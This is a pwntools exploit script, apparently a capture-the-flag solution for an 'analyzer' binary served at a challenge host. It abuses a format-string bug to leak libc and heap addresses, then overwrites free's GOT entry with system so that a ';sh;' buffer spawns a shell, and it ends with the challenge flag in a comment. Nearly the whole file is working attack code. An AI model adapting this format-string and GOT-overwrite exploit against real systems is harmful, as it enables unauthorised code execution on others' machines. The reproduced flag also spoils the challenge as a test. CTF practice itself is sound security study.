#!/usr/bin/python3

from pwn import *

exe = ELF('analyzer_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                b* 0x00000000004018d9
                b* 0x401A0D 
                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chal.osugaming.lol', 7273)
else:
        p = process(exe.path)

GDB()
payload = flat({
    0x0: p8(1),
    0x1: p32(0x1),
    0x5: p8(0xb),
    0x6: b'test',
    0x80-5: p8(0xb),
    0x80-4: b'b%51$p|%9$p|'
}, filler=[0], length=0xff).hex()
sl(payload)
p.recvuntil(b'Player name: ')
libc.address = int(p.recvuntil(b'|', drop=True).decode(), 16) - 0x29d90
heap = int(p.recvuntil(b'|', drop=True), 16) 
info("libc.address: " + hex(libc.address))
info("heap: " + hex(heap))
########
# ow got free(buf) -> system(buf) w buf = "\x1;sh;\x0b\x00"
package = {
        libc.sym.system & 0xffff: exe.got.free,
        libc.sym.system >> 16 & 0xffff: exe.got.free+2,
        libc.sym.system >> 32 & 0xffff: exe.got.free+4,
}
order = sorted(package)

payload = flat({
    0x0: p8(1),
    0x1: p32(996700987), # ";sh;"
    0x5: p8(0xb),
    0x6: b't' + p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]]),
    0x80-5: p8(0xb),
    0x80-4: f';%{order[0]}c%19$hn%{order[1]-order[0]}c%20$hn%{order[2]-order[1]}c%21$hn'.encode().ljust(8*5+1) + p64(package[order[0]]) + p64(package[order[1]]) + p64(package[order[2]]),
}, filler=[0], length=0xff).hex()
sl(payload)
p.interactive()
# osu{1_h4te_c!!!!!!!!}